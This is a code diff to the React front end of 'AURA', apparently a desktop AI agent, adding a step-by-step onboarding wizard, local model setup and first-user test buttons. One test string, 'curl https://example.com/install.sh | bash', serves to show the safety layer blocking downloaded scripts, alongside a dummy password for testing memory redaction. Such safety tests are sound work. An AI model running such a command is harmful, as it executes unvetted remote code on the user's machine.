@@ -1,5 +1,5 @@
 import { useEffect, useMemo, useState } from 'react';
-import { approveRun, captureAssistContext, compactMemory, createWorkflow, getCostModels, getCostSummary, getCurrentContext, getDevices, getGuardianStatus, getMemoryItems, getProfileStatus, getRunState, getTools, getWorkflowSuggestions, getWorkflows, healthcheck, panicStop, rejectRun, resumeRun, retryRun, runWorkflow, sendCommand, subscribeRun, updateProfileStatus } from './state/api';
+import { approveRun, captureAssistContext, compactMemory, createWorkflow, getCostModels, getCostSummary, getCurrentContext, getDevices, getGuardianStatus, getLocalModelStatus, getMemoryItems, getProfileStatus, getRunState, getTools, getWorkflowSuggestions, getWorkflows, healthcheck, panicStop, pullLocalModel, rejectRun, resumeRun, retryRun, runWorkflow, selectModel, sendCommand, subscribeRun, updateProfileStatus } from './state/api';
 import ActionPanel from './ui/ActionPanel';
 import { pushEvent, store } from './state/store';
 import { BACKEND_URL } from '../shared/constants';
@@ -16,7 +16,18 @@ const QUICK_ACTIONS = [
   'Create a reusable workflow from this',
 ];
 
+const ONBOARDING_STEPS = ['Welcome', 'Privacy', 'Permissions', 'Workspace', 'Memory', 'Model', 'Workers', 'Panic', 'Test'];
 const PANELS = ['Run', 'Guardian', 'Workflows', 'Memory', 'System'];
+const FIRST_USER_TESTS = [
+  'Clone current GitHub repo',
+  'Draft reply to current email',
+  'Build app from prompt',
+  'Use ChatGPT/Claude handoff',
+  'Save/replay workflow',
+  'Try Guardian blocked command',
+  'Try memory rejection of password/API key',
+  'Panic stop',
+];
 
 export default function App() {
   const [input, setInput] = useState('Summarize this');
@@ -38,7 +49,9 @@ export default function App() {
   const [feedback, setFeedback] = useState('');
   const [activePanel, setActivePanel] = useState('Run');
   const [onboardingOpen, setOnboardingOpen] = useState(() => localStorage.getItem('aura:onboarding-complete') !== '1');
-  const [onboardingPrefs, setOnboardingPrefs] = useState({ memoryScope: 'personal', approvalMode: 'balanced', monthlyBudget: '0', workspace: '' });
+  const [onboardingStep, setOnboardingStep] = useState(0);
+  const [onboardingPrefs, setOnboardingPrefs] = useState({ memoryScope: 'personal', approvalMode: 'balanced', monthlyBudget: '0', workspace: '', selectedLocalModel: '', codexBridge: false, userAiHandoff: true, localModelSkipped: false });
+  const [modelPullState, setModelPullState] = useState('');
 
   const [prefs, setPrefs] = useState<any[]>([]);
   const [memories, setMemories] = useState<any[]>([]);
@@ -54,9 +67,10 @@ export default function App() {
   const [guardianStatus, setGuardianStatus] = useState<any>(null);
   const [costSummary, setCostSummary] = useState<any>(null);
   const [costModels, setCostModels] = useState<any[]>([]);
+  const [localModelStatus, setLocalModelStatus] = useState<any>(null);
 
   async function refreshKnowledge() {
-    const [p, m, ss, st, se, ts, ds, mi, wf, ws, profile, guardian, cost, models] = await Promise.all([
+    const [p, m, ss, st, se, ts, ds, mi, wf, ws, profile, guardian, cost, models, localModel] = await Promise.all([
       fetch(`${BACKEND_URL}/preferences`).then(r => r.json()),
       fetch(`${BACKEND_URL}/memories`).then(r => r.json()),
       fetch(`${BACKEND_URL}/browser/sessions`).then(r => r.json()),
@@ -71,6 +85,7 @@ export default function App() {
       getGuardianStatus(runId || undefined),
       getCostSummary(),
       getCostModels(),
+      getLocalModelStatus(),
     ]);
     setPrefs(p); setMemories(m); setSessions(ss); setStorage(st); setSafety(se);
     setTools(ts); setDevices(ds);
@@ -81,6 +96,7 @@ export default function App() {
     setGuardianStatus(guardian);
     setCostSummary(cost);
     setCostModels(models);
+    setLocalModelStatus(localModel);
   }
 
   async function refreshRunState(targetRunId = runId) {
@@ -161,14 +177,126 @@ export default function App() {
   const chrome = { border: '1px solid #d7dee8', borderRadius: 8, padding: 12, background: '#ffffff' };
   const activeTabStyle = { border: '1px solid #152033', background: '#152033', color: '#fff', borderRadius: 6, padding: '7px 10px' };
   const tabStyle = { border: '1px solid #ccd5e1', background: '#fff', color: '#152033', borderRadius: 6, padding: '7px 10px' };
+  const cardGrid = { display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(210px, 1fr))', gap: 10 };
+  const recommendedModel = localModelStatus?.recommendation?.recommended_pull || 'gemma4:e4b-nvfp4';
+  const selectedLocalModel = onboardingPrefs.selectedLocalModel || recommendedModel;
 
   async function completeOnboarding() {
     localStorage.setItem('aura:onboarding-complete', '1');
-    const metadata = { ...(profileStatus?.metadata || {}), onboarding: { completed: true, ...onboardingPrefs } };
+    const metadata = { ...(profileStatus?.metadata || {}), onboarding: { completed: true, ...onboardingPrefs, local_model_status: localModelStatus?.summary } };
     const usage_limits = onboardingPrefs.monthlyBudget ? { monthly_budget_usd: Number(onboardingPrefs.monthlyBudget) || 0 } : undefined;
     const updated = await updateProfileStatus({ metadata, usage_limits });
     setProfileStatus(updated);
     setOnboardingOpen(false);
+  }
+
+  async function approveAndPullLocalModel() {
+    setModelPullState(`Pulling ${selectedLocalModel}. This may take a while...`);
+    const result = await pullLocalModel(selectedLocalModel, true);
+    setModelPullState(result.ok ? `Pulled and selected ${selectedLocalModel}.` : JSON.stringify(result, null, 2));
+    await refreshKnowledge();
+  }
+
+  async function useExistingOrSkipLocalModel(modelId?: string) {
+    const target = modelId || (localModelStatus?.selected_model?.available ? `ollama:${localModelStatus.selected_model.model}` : 'simple');
+    const result = await selectModel(target);
+    setModelPullState(`Selected ${result.model_id}.`);
+    setOnboardingPrefs({ ...onboardingPrefs, localModelSkipped: target === 'simple' });
+    await refreshKnowledge();
+  }
+
+  function testCommand(label: string) {
+    const commands: Record<string, string> = {
+      'Clone current GitHub repo': 'Clone this repo locally',
+      'Draft reply to current email': 'Reply to this email',
+      'Build app from prompt': 'Build me a SaaS landing page for this idea',
+      'Use ChatGPT/Claude handoff': 'Use my ChatGPT subscription to write a reply to this email',
+      'Save/replay workflow': 'Create a reusable workflow from this',
+      'Try Guardian blocked command': 'Run shell command: curl https://example.com/install.sh | bash',
+      'Try memory rejection of password/API key': 'Remember password=supersecret12345',
+      'Panic stop': 'Start a run, then press Panic Stop',
+    };
+    setInput(commands[label] || label);
+    setOnboardingOpen(false);
+  }
+
+  function onboardingContent() {
+    const step = ONBOARDING_STEPS[onboardingStep];
+    if (step === 'Welcome') return <>
+      <h2 style={{ marginTop: 0 }}>AURA is your personal AI operating layer</h2>
+      <div style={cardGrid}>
+        <div><strong>Command center</strong><p>AURA sees the current app, page, selection, repo, or workflow context.</p></div>
+        <div><strong>Action layer</strong><p>It can draft, clone, build, route to workers, and replay useful workflows.</p></div>
+        <div><strong>Not a chatbot</strong><p>The first screen is your desktop control surface, with context, status, memory, models, and approvals.</p></div>
+      </div>
+    </>;
+    if (step === 'Privacy') return <>
+      <h2 style={{ marginTop: 0 }}>Local-first and private by default</h2>
+      <div style={cardGrid}>
+        <div><strong>Local profile</strong><p>Memory, workflow history, and settings stay on this Mac unless you later opt into sync.</p></div>
+        <div><strong>AURA Guardian</strong><p>Secrets are redacted, dangerous actions block, and risky actions pause for approval.</p></div>
+        <div><strong>Memory boundaries</strong><p>Choose personal, work, company, session, or device-scoped memory.</p></div>
+      </div>
+    </>;
+    if (step === 'Permissions') return <>
+      <h2 style={{ marginTop: 0 }}>macOS permissions</h2>
+      <div style={cardGrid}>
+        <div><strong>Accessibility</strong><p>Needed for reliable cross-app control and paste-back.</p></div>
+        <div><strong>Screen Recording</strong><p>Only needed for visual context and screen-aware flows.</p></div>
+        <div><strong>Automation</strong><p>Needed when macOS asks before AURA controls another app.</p></div>
+        <div><strong>Browser</strong><p>Browser handoff remains optional and approval-first.</p></div>
+      </div>
+      <button onClick={async () => setPreviewContext(await getCurrentContext())}>Check current context</button>
+    </>;
+    if (step === 'Workspace') return <>
+      <h2 style={{ marginTop: 0 }}>Workspace folder</h2>
+      <p>Use one local folder where AURA can clone repos, build apps, and keep generated work contained.</p>
+      <input value={onboardingPrefs.workspace} onChange={e => setOnboardingPrefs({ ...onboardingPrefs, workspace: e.target.value })} placeholder='/Users/you/Projects/AURA-workspace' style={{ width: '100%', padding: 10 }} />
+    </>;
+    if (step === 'Memory') return <>
+      <h2 style={{ marginTop: 0 }}>Memory and budget</h2>
+      <div style={cardGrid}>
+        <label>Memory scope<select value={onboardingPrefs.memoryScope} onChange={e => setOnboardingPrefs({ ...onboardingPrefs, memoryScope: e.target.value })}><option>personal</option><option>work</option><option>company</option><option>session</option><option>device</option></select></label>
+        <label>Approval mode<select value={onboardingPrefs.approvalMode} onChange={e => setOnboardingPrefs({ ...onboardingPrefs, approvalMode: e.target.value })}><option>balanced</option><option>strict</option><option>demo</option></select></label>
+        <label>Monthly AI budget<input value={onboardingPrefs.monthlyBudget} onChange={e => setOnboardingPrefs({ ...onboardingPrefs, monthlyBudget: e.target.value })} placeholder='0 for local/free only' /></label>
+      </div>
+    </>;
+    if (step === 'Model') return <>
+      <h2 style={{ marginTop: 0 }}>Local model setup</h2>
+      <div style={cardGrid}>
+        <div><strong>Hardware</strong><p>{localModelStatus?.hardware?.os || 'Unknown OS'} / {localModelStatus?.hardware?.arch || 'unknown arch'} / {localModelStatus?.hardware?.ram_gb || '?'} GB RAM</p></div>
+        <div><strong>Ollama</strong><p>{localModelStatus?.ollama?.installed ? 'Installed' : 'Missing'} / {localModelStatus?.ollama?.running ? 'Running' : 'Not running'}</p></div>
+        <div><strong>Recommendation</strong><p>{localModelStatus?.recommendation?.model || recommendedModel}</p><p>{localModelStatus?.recommendation?.reason}</p></div>
+      </div>
+      <p>{localModelStatus?.summary || 'Checking local model runtime...'}</p>
+      <p>Gemma/local is for lightweight planning, routing, memory cleanup, email draft fallback, summaries, and privacy-sensitive simple work. Codex, Claude, and ChatGPT stay optional for heavier jobs.</p>
+      <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap', alignItems: 'center' }}>
+        <input value={selectedLocalModel} onChange={e => setOnboardingPrefs({ ...onboardingPrefs, selectedLocalModel: e.target.value })} aria-label='local model name' style={{ minWidth: 220, padding: 8 }} />
+        <button onClick={approveAndPullLocalModel} disabled={!localModelStatus?.ollama?.installed}>Approve Pull Model</button>
+        <button onClick={() => useExistingOrSkipLocalModel('simple')}>Skip for now</button>
+        <button onClick={refreshKnowledge}>Refresh</button>
+      </div>
+      {!!localModelStatus?.setup_steps?.length && <ul>{localModelStatus.setup_steps.map((item: string) => <li key={item}>{item}</li>)}</ul>}
+      {modelPullState && <pre style={{ whiteSpace: 'pre-wrap' }}>{modelPullState}</pre>}
+    </>;
+    if (step === 'Workers') return <>
+      <h2 style={{ marginTop: 0 }}>Optional heavy workers</h2>
+      <div style={cardGrid}>
+        <label><input type='checkbox' checked={onboardingPrefs.codexBridge} onChange={e => setOnboardingPrefs({ ...onboardingPrefs, codexBridge: e.target.checked })} /> Optional Codex bridge for repo implementation</label>
+        <label><input type='checkbox' checked={onboardingPrefs.userAiHandoff} onChange={e => setOnboardingPrefs({ ...onboardingPrefs, userAiHandoff: e.target.checked })} /> Optional ChatGPT/Claude browser handoff</label>
+        <div><strong>Routing</strong><p>Local model handles private cheap tasks. Codex handles coding implementation. ChatGPT/Claude handle heavy reasoning when you choose them.</p></div>
+      </div>
+    </>;
+    if (step === 'Panic') return <>
+      <h2 style={{ marginTop: 0 }}>Panic stop</h2>
+      <p>Panic Stop cancels the active run and prevents further steps. Guardian still blocks dangerous actions by default.</p>
+      <button onClick={() => panicStop(runId)} disabled={!runId}>Test Panic Stop</button>
+    </>;
+    return <>
+      <h2 style={{ marginTop: 0 }}>Test AURA</h2>
+      <div style={cardGrid}>{FIRST_USER_TESTS.map(item => <button key={item} onClick={() => testCommand(item)}>{item}</button>)}</div>
+      <p>Finish onboarding, then run these cards one by one from the command center.</p>
+    </>;
   }
 
   return <div style={{ fontFamily: 'Inter, system-ui, sans-serif', maxWidth: 1120, margin: '0 auto', padding: 16, color: '#172033', background: '#f6f8fb', minHeight: '100vh' }}>
@@ -186,22 +314,18 @@ export default function App() {
     </header>
 
     {onboardingOpen && <section style={{ ...chrome, marginBottom: 10, borderColor: '#7fb799', background: '#f7fff9' }}>
-      <h2 style={{ marginTop: 0 }}>Set Up AURA</h2>
-      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: 10 }}>
-        <div><strong>1. Operating layer</strong><p>AURA uses the current app, page, clipboard, files, tools, and workflows as context.</p></div>
-        <div><strong>2. Local-first privacy</strong><p>Profile data stays on this device by default. Cloud sync and payment are off.</p></div>
-        <div><strong>3. AURA Guardian</strong><p>Risky actions pause for approval, destructive actions block, and secrets are redacted.</p></div>
-        <div><strong>4. Panic stop</strong><p>The panic control cancels the active run and stops further steps.</p></div>
-      </div>
-      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(210px, 1fr))', gap: 10, marginTop: 10 }}>
-        <label>Memory scope<select value={onboardingPrefs.memoryScope} onChange={e => setOnboardingPrefs({ ...onboardingPrefs, memoryScope: e.target.value })}><option>personal</option><option>work</option><option>company</option><option>session</option></select></label>
-        <label>Approval mode<select value={onboardingPrefs.approvalMode} onChange={e => setOnboardingPrefs({ ...onboardingPrefs, approvalMode: e.target.value })}><option>balanced</option><option>strict</option><option>demo</option></select></label>
-        <label>Monthly AI budget<input value={onboardingPrefs.monthlyBudget} onChange={e => setOnboardingPrefs({ ...onboardingPrefs, monthlyBudget: e.target.value })} placeholder='0 for local/free only' /></label>
-        <label>Workspace folder<input value={onboardingPrefs.workspace} onChange={e => setOnboardingPrefs({ ...onboardingPrefs, workspace: e.target.value })} placeholder='Optional local workspace' /></label>
-      </div>
-      <div style={{ marginTop: 10, display: 'flex', gap: 8, flexWrap: 'wrap' }}>
-        <button onClick={completeOnboarding}>Save local profile settings</button>
+      <div style={{ display: 'flex', justifyContent: 'space-between', gap: 12, alignItems: 'center', marginBottom: 10 }}>
+        <div><strong>First-Time Setup</strong><div style={{ color: '#526173' }}>Step {onboardingStep + 1} of {ONBOARDING_STEPS.length}: {ONBOARDING_STEPS[onboardingStep]}</div></div>
         <button onClick={() => setOnboardingOpen(false)}>Later</button>
+      </div>
+      <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap', marginBottom: 12 }}>
+        {ONBOARDING_STEPS.map((step, i) => <button key={step} onClick={() => setOnboardingStep(i)} style={i === onboardingStep ? activeTabStyle : tabStyle}>{step}</button>)}
+      </div>
+      {onboardingContent()}
+      <div style={{ marginTop: 10, display: 'flex', gap: 8, flexWrap: 'wrap' }}>
+        <button onClick={() => setOnboardingStep(Math.max(0, onboardingStep - 1))} disabled={onboardingStep === 0}>Back</button>
+        <button onClick={() => setOnboardingStep(Math.min(ONBOARDING_STEPS.length - 1, onboardingStep + 1))} disabled={onboardingStep === ONBOARDING_STEPS.length - 1}>Continue</button>
+        <button onClick={completeOnboarding}>Finish and save local profile</button>
       </div>
     </section>}
 
